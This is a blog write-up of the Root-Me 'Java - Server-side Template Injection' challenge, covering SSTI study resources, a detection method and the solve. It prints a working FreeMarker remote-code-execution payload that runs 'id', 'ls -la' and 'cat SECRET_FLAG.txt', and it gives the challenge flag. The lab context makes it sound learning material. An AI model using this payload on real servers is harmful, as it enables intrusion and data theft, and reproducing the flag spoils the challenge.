+++
title = "Deepening My SSTI Knowledge: From Study to a Root-Me RCE"
description = "A journey from studying the theory of Server-Side Template Injection (SSTI) to applying it to solve a Java/FreeMarker challenge on Root-Me."
date = "2025-09-09"
draft = false
tags = ["SSTI", "RootMe", "Cybersecurity", "Java", "FreeMarker", "RCE"]
+++

After my first taste of Server-Side Template Injection (SSTI) with the PicoCTF challenge, I was hooked. It was a relatively straightforward introduction, and it left me wanting to learn more. This post documents my journey of diving deeper into SSTI, from studying the theory to solving a more complex challenge on Root-Me.

---

## Broadening My SSTI Understanding

I started by consuming as much information as I could find on SSTI. Here are some of the resources I found most helpful:

*   [https://www.youtube.com/watch?v=x_1A9rCxREs](https://www.youtube.com/watch?v=x_1A9rCxREs)
*   [https://tcm-sec.com/find-and-exploit-server-side-template-injection-ssti/](https://tcm-sec.com/find-and-exploit-server-side-template-injection-ssti/)
*   [https://hackerone.com/reports/125980](https://hackerone.com/reports/125980)
*   [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI) (last update is older than 3 years)
*   [https://www.pmnh.site/post/writeup_spring_el_waf_bypass/](https://www.pmnh.site/post/writeup_spring_el_waf_bypass/)
*   [https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)
*   [https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Server-Side%20Template%20Injection%20RCE%20For%20The%20Modern%20Web%20App%20-%20BlackHat%2015.pdf)
*   [https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)

### Key Takeaways

*   **SSTI vs. XSS:** While they might seem similar, SSTI is far more dangerous. It attacks the server's internals directly, often leading to Remote Code Execution (RCE), whereas Cross-Site Scripting (XSS) is a client-side vulnerability.
*   **Template Engines as a Feature:** Many applications, like wikis, blogs, and content management systems, intentionally expose template engines to users for rich functionality. The key is whether these engines are properly sandboxed.

### A Methodology for SSTI

I formulated a simple methodology for tackling potential SSTI vulnerabilities:

1.  **Detect:** Look for plaintext input that gets rendered with some processing. This is a prime candidate for SSTI.
2.  **Identify:**
    *   Probe with invalid syntax to trigger errors that might reveal the template engine.
    *   Use a decision tree of payloads to identify the engine.
    *   Use tools like Wappalyzer to identify the server's language and framework, which helps narrow down the possibilities.
3.  **Exploit:**
    *   **Read the Docs:** Once the engine is identified, read its documentation, paying close attention to security sections and built-in methods.
    *   **Explore:** Understand the environment and look for gadgets that can be abused.
    *   **Attack:** Build an attack vector and iterate until you find something that works. Escalate the attack to achieve a higher impact, like RCE.

---

## The Root-Me Challenge: Java SSTI

With a solid theoretical foundation, I was ready for a new challenge: [Java - Server-side Template Injection](https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection).

### Detection and Identification

The challenge presented a simple form that took a `nickname` as input. I used Caido to replay the request and automate the testing of a list of common SSTI payloads from the [PayloadBox repo](https://github.com/payloadbox/ssti-payloads).

Here is the `curl` command for the request:
```bash
curl 'http://challenge01.root-me.org/web-serveur/ch41/check' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
  -H 'Accept: text/plain, */*; q=0.01' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: http://challenge01.root-me.org' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://challenge01.root-me.org/web-serveur/ch41/' \
  -H 'Cookie: _ga_SRYSKX09J7=GS2.1.s1757387996$o1$g1$t1757388045$j11$l0$h0; _ga=GA1.1.1521611932.1757387996' \
  -H 'Priority: u=0' \
  --data-raw 'nickname=hi'
```

Two payloads worked:

*   `%24%7B6*6%7D` (URL-decoded: `${6*6}`) resulted in `36`
*   `%23%7B3*3%7D` (URL-decoded: `#{3*3}`) resulted in `9`

This suggested a Java-based template engine. To confirm, I sent a payload with invalid syntax: `%24%7B%7B3*3%7D%7D`. The server responded with a detailed error message:

```json
{
    "timestamp": 1757388561239,
    "status": 500,
    "error": "Internal Server Error",
    "exception": "freemarker.core.ParseException",
    "message": "..."
}
```

The exception clearly identified the template engine as **FreeMarker**.

### Exploration and Exploitation

Now that I knew I was dealing with FreeMarker, I started researching ways to achieve RCE. I found that the `freemarker.template.utility.Execute` class could be used to run shell commands.

My first attempt to use it failed, likely due to a syntax error or issues with URL encoding:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

I took a step back and started with a simpler payload to confirm I could assign variables:

```freemarker
<#assign myVar = "Hello World"> ${myVar}
```

This worked! It returned `Hello World`. Now, I tried to instantiate the `Execute` class again:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex}
```

This returned a 200 OK response, but no output. This was a good sign. It meant the object was likely created successfully. I was expecting an object hash, but the empty response was still promising.

I then revisited my RCE payload, making sure the syntax was correct. I realized I had made a silly mistake in my first attempt: I had forgotten the closing curly brace `}`. With the corrected payload, I was able to execute the `id` command:

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

The server responded with:

```
uid=1109(web-serveur-ch41) gid=1109(web-serveur-ch41) groupes=1109(web-serveur-ch41),100(users)
```

I had RCE!

### Getting the Flag

Now for the final steps:

1.  **List the files:**

    ```freemarker
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -la") }
    ```

    This revealed a file named `SECRET_FLAG.txt`.

2.  **Read the flag:**

    ```freemarker
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
    ```

And there it was: **`B3wareOfT3mplat3Inj3ction`**

---

This challenge was a fantastic way to solidify my understanding of SSTI. It required a more methodical approach than the PicoCTF challenge and highlighted the importance of careful payload construction and error analysis.

---

## Related Posts

*   [My First SSTI Adventure: A PicoCTF Walkthrough](/post/picoctf-ssti-journey/)